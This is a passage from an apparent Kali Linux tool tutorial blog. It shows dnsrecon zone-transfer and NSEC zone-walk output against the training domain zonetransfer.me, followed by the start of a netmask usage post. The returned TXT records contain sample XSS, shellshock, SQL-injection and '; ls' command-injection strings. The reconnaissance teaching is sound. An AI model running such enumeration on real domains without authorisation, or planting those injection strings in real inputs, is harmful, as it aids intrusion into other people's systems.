<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d zonetransfer.me -a
</span><span class='line'>[*] Performing General Enumeration of Domain: zonetransfer.me
</span><span class='line'>[*] Checking for Zone Transfer for zonetransfer.me name servers
</span><span class='line'>[*] Resolving SOA Record
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Resolving NS Records
</span><span class='line'>[*] NS Servers found:
</span><span class='line'>[*]   NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]   NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*] Removing any duplicate NS server IP Addresses...
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 167.88.42.94
</span><span class='line'>[-] Zone Transfer Failed for 167.88.42.94!
</span><span class='line'>[-] Port 53 TCP is being filtered
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 81.4.108.41
</span><span class='line'>[*] 81.4.108.41 Has port 53 TCP Open
</span><span class='line'>[*] Zone Transfer was successful!!
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]    NS intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    NS intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
</span><span class='line'>[*]    TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
</span><span class='line'>[*]    TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
</span><span class='line'>[*]    TXT AbCdEfG
</span><span class='line'>[*]    TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
</span><span class='line'>[*]    TXT ; ls
</span><span class='line'>[*]    TXT () { :]}; echo ShellShocked
</span><span class='line'>[*]    TXT ' or 1=1 --
</span><span class='line'>[*]    TXT Robin Wood
</span><span class='line'>[*]    PTR www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A @.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
</span><span class='line'>[*]    HINFO Casio fx-700G Windows XP
</span><span class='line'>[*]    RP robin robinwood
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    LOC 53 20 56.558 N 1 38 33.526 W 0.00m
</span><span class='line'>[*]    NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
</span><span class='line'>[*]    NAPTR P 1 1  email.zonetransfer.me E2U+email
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
</span><span class='line'>[*]    DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
</span><span class='line'>[*]    NSEC _sip._tcp
</span><span class='line'>[*]    NSEC sqli
</span><span class='line'>[*]    NSEC vpn
</span><span class='line'>[*]    NSEC asfdbbox
</span><span class='line'>[*]    NSEC deadbeef
</span><span class='line'>[*]    NSEC intns1
</span><span class='line'>[*]    NSEC 157.177.147.217.IN-ADDR.ARPA
</span><span class='line'>[*]    NSEC asfdbauthdns
</span><span class='line'>[*]    NSEC dc-office
</span><span class='line'>[*]    NSEC alltcpportsopen.firewall.test
</span><span class='line'>[*]    NSEC canberra-office
</span><span class='line'>[*]    NSEC robinwood
</span><span class='line'>[*]    NSEC testing
</span><span class='line'>[*]    NSEC www
</span><span class='line'>[*]    NSEC Info
</span><span class='line'>[*]    NSEC dr
</span><span class='line'>[*]    NSEC @
</span><span class='line'>[*]    NSEC asfdbvolume
</span><span class='line'>[*]    NSEC xss
</span><span class='line'>[*]    NSEC email
</span><span class='line'>[*]    NSEC internal
</span><span class='line'>[*]    NSEC cmdexec
</span><span class='line'>[*]    NSEC intns2
</span><span class='line'>[*]    NSEC office
</span><span class='line'>[*]    NSEC contact
</span><span class='line'>[*]    NSEC owa
</span><span class='line'>[*]    NSEC staging
</span><span class='line'>[*]    NSEC sshock
</span><span class='line'>[*]    NSEC sip
</span><span class='line'>[*]    NSEC rp
</span><span class='line'>[*]    NSEC DZC
</span><span class='line'>[*]    NSEC ipv6actnow.org
</span><span class='line'>[*] Checking for Zone Transfer for zonetransfer.me name servers
</span><span class='line'>[*] Resolving SOA Record
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Resolving NS Records
</span><span class='line'>[*] NS Servers found:
</span><span class='line'>[*]   NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]   NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*] Removing any duplicate NS server IP Addresses...
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 167.88.42.94
</span><span class='line'>[-] Zone Transfer Failed for 167.88.42.94!
</span><span class='line'>[-] Port 53 TCP is being filtered
</span><span class='line'>[*]  
</span><span class='line'>[*] Trying NS server 81.4.108.41
</span><span class='line'>[*] 81.4.108.41 Has port 53 TCP Open
</span><span class='line'>[*] Zone Transfer was successful!!
</span><span class='line'>[*]    SOA nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm1.digi.ninja 81.4.108.41
</span><span class='line'>[*]    NS nsztm2.digi.ninja 167.88.42.94
</span><span class='line'>[*]    NS intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    NS intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
</span><span class='line'>[*]    TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
</span><span class='line'>[*]    TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
</span><span class='line'>[*]    TXT AbCdEfG
</span><span class='line'>[*]    TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
</span><span class='line'>[*]    TXT ; ls
</span><span class='line'>[*]    TXT () { :]}; echo ShellShocked
</span><span class='line'>[*]    TXT ' or 1=1 --
</span><span class='line'>[*]    TXT Robin Wood
</span><span class='line'>[*]    PTR www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
</span><span class='line'>[*]    MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
</span><span class='line'>[*]    MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A @.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
</span><span class='line'>[*]    CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
</span><span class='line'>[*]    HINFO Casio fx-700G Windows XP
</span><span class='line'>[*]    RP robin robinwood
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    AFSDB 1 asfdbbox
</span><span class='line'>[*]    LOC 53 20 56.558 N 1 38 33.526 W 0.00m
</span><span class='line'>[*]    NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
</span><span class='line'>[*]    NAPTR P 1 1  email.zonetransfer.me E2U+email
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
</span><span class='line'>[*]    DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
</span><span class='line'>[*]    DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
</span><span class='line'>[*]    NSEC _sip._tcp
</span><span class='line'>[*]    NSEC sqli
</span><span class='line'>[*]    NSEC vpn
</span><span class='line'>[*]    NSEC asfdbbox
</span><span class='line'>[*]    NSEC deadbeef
</span><span class='line'>[*]    NSEC intns1
</span><span class='line'>[*]    NSEC 157.177.147.217.IN-ADDR.ARPA
</span><span class='line'>[*]    NSEC asfdbauthdns
</span><span class='line'>[*]    NSEC dc-office
</span><span class='line'>[*]    NSEC alltcpportsopen.firewall.test
</span><span class='line'>[*]    NSEC canberra-office
</span><span class='line'>[*]    NSEC robinwood
</span><span class='line'>[*]    NSEC testing
</span><span class='line'>[*]    NSEC www
</span><span class='line'>[*]    NSEC Info
</span><span class='line'>[*]    NSEC dr
</span><span class='line'>[*]    NSEC @
</span><span class='line'>[*]    NSEC asfdbvolume
</span><span class='line'>[*]    NSEC xss
</span><span class='line'>[*]    NSEC email
</span><span class='line'>[*]    NSEC internal
</span><span class='line'>[*]    NSEC cmdexec
</span><span class='line'>[*]    NSEC intns2
</span><span class='line'>[*]    NSEC office
</span><span class='line'>[*]    NSEC contact
</span><span class='line'>[*]    NSEC owa
</span><span class='line'>[*]    NSEC staging
</span><span class='line'>[*]    NSEC sshock
</span><span class='line'>[*]    NSEC sip
</span><span class='line'>[*]    NSEC rp
</span><span class='line'>[*]    NSEC DZC
</span><span class='line'>[*]    NSEC ipv6actnow.org
</span><span class='line'>[-] A timeout error occurred please make sure you can reach the target DNS Servers
</span><span class='line'>[-] directly and requests are not being filtered. Increase the timeout from 3.0 second
</span><span class='line'>[-] to a higher number with --lifetime &lt;time&gt; option.</span></code></pre></td></tr></table></div></figure>


<p>Here we see some interesting records that might warrant an additional explanation:</p>

<p><strong>SOA</strong> &ndash; the State of Authority record indicates which DNS server is the best source of information for the specified domain</p>

<p><strong>HINFO</strong> specifies the host / server&rsquo;s type of CPU and operating system. We can see a Casio here, which is highly unlikely xD</p>

<p><strong>LOC</strong> &ndash; geolocation information, here in latitude / longitude values</p>

<p><strong>TXT</strong> &ndash; text records, with plenty of information like mail addresses, phone numbers, XSS and shellshock attempts</p>

<ul>
<li>map internal network with DNSSEC zone walk</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d zonetransfer.me -z
</span><span class='line'>[...]
</span><span class='line'>[*] Performing NSEC Zone Walk for zonetransfer.me
</span><span class='line'>[*] Getting SOA record for zonetransfer.me
</span><span class='line'>[*] Name Server 81.4.108.41 will be used
</span><span class='line'>[*]    A zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    SRV _sip._tcp.zonetransfer.me www.zonetransfer.me 217.147.177.157 5060 0
</span><span class='line'>[*]    A 157.177.147.217.IN-ADDR.ARPA.zonetransfer.me no_ip
</span><span class='line'>[*]    A asfdbauthdns.zonetransfer.me no_ip
</span><span class='line'>[*]    A asfdbbox.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    A asfdbvolume.zonetransfer.me no_ip
</span><span class='line'>[*]    A canberra-office.zonetransfer.me 202.14.81.230
</span><span class='line'>[*]    A cmdexec.zonetransfer.me no_ip
</span><span class='line'>[*]    A contact.zonetransfer.me no_ip
</span><span class='line'>[*]    A dc-office.zonetransfer.me 143.228.181.132
</span><span class='line'>[*]    AAAA deadbeef.zonetransfer.me dead:beaf::
</span><span class='line'>[*]    A dr.zonetransfer.me no_ip
</span><span class='line'>[*]    A DZC.zonetransfer.me no_ip
</span><span class='line'>[*]    A email.zonetransfer.me 74.125.206.26
</span><span class='line'>[*]    A Info.zonetransfer.me no_ip
</span><span class='line'>[*]    A internal.zonetransfer.me no_ip
</span><span class='line'>[*]    A intns1.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A intns2.zonetransfer.me 167.88.42.94
</span><span class='line'>[*]    A office.zonetransfer.me 4.23.39.254
</span><span class='line'>[*]    AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
</span><span class='line'>[*]    A owa.zonetransfer.me 207.46.197.32
</span><span class='line'>[*]    A robinwood.zonetransfer.me no_ip
</span><span class='line'>[*]    A rp.zonetransfer.me no_ip
</span><span class='line'>[*]    A sip.zonetransfer.me no_ip
</span><span class='line'>[*]    A sqli.zonetransfer.me no_ip
</span><span class='line'>[*]    A sshock.zonetransfer.me no_ip
</span><span class='line'>[*]    A staging.zonetransfer.me 52.64.62.190
</span><span class='line'>[*]    A staging.zonetransfer.me 13.54.224.164
</span><span class='line'>[*]    A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
</span><span class='line'>[*]    CNAME testing.zonetransfer.me www.zonetransfer.me
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A vpn.zonetransfer.me 174.36.59.154
</span><span class='line'>[*]    A www.zonetransfer.me 217.147.177.157
</span><span class='line'>[*]    A xss.zonetransfer.me no_ip
</span><span class='line'>[*] 34 records found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>sample CSV</li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/tools/dnsrecon.png" title="dnsrecon" alt="dnsrecon CSV report"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ The only way to keep your health is to  \
</span><span class='line'>| eat what you don't want, drink what you |
</span><span class='line'>| don't like, and do what you'd rather    |
</span><span class='line'>| not.                                    |
</span><span class='line'>|                                         |
</span><span class='line'>\ -- Mark Twain                           /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[netmask - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools/"/>
    <updated>2017-07-07T05:55:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to convert between different types of netmasks and network addresses, or generate optimized netmasks for firewall rules. netmask can take care of your netmasks!</p>

<p>Homepage: <a href="https://github.com/tlby/netmask">https://github.com/tlby/netmask</a></p>

<!-- more -->


<h2>netmask description</h2>

<blockquote><p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to
generate the smallest list of rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p></blockquote>

<p>Manpage: <a href="https://linux.die.net/man/1/netmask">https://linux.die.net/man/1/netmask</a></p>

<h2>netmask options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This is netmask, an address netmask generation utility
</span><span class='line'>Usage: netmask spec [spec ...]
</span><span class='line'>  -h, --help          Print a summary of the options
</span><span class='line'>  -v, --version           Print the version number
</span><span class='line'>  -d, --debug         Print status/progress information
</span><span class='line'>  -s, --standard      Output address/netmask pairs
</span><span class='line'>  -c, --cidr          Output CIDR format address lists
</span><span class='line'>  -i, --cisco         Output Cisco style address lists
</span><span class='line'>  -r, --range         Output ip address ranges
</span><span class='line'>  -x, --hex           Output address/netmask pairs in hex
</span><span class='line'>  -o, --octal         Output address/netmask pairs in octal
</span><span class='line'>  -b, --binary            Output address/netmask pairs in binary
</span><span class='line'>  -n, --nodns         Disable DNS lookups for addresses
</span><span class='line'>  -f, --files         Treat arguments as input files
</span><span class='line'>Definitions:
</span><span class='line'>  a spec can be any of:
</span><span class='line'>    address
</span><span class='line'>    address:address
</span><span class='line'>    address:+address
</span><span class='line'>    address/mask
</span><span class='line'>  an address can be any of:
</span><span class='line'>    N     decimal number
</span><span class='line'>    0N        octal number
</span><span class='line'>    0xN       hex number
</span><span class='line'>    N.N.N.N   dotted quad
</span><span class='line'>    hostname  dns domain name
</span><span class='line'>  a mask is the number of bits set to one from the left</span></code></pre></td></tr></table></div></figure>


<h2>netmask usage</h2>

<ul>
<li>output standard address / netmask pairs</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
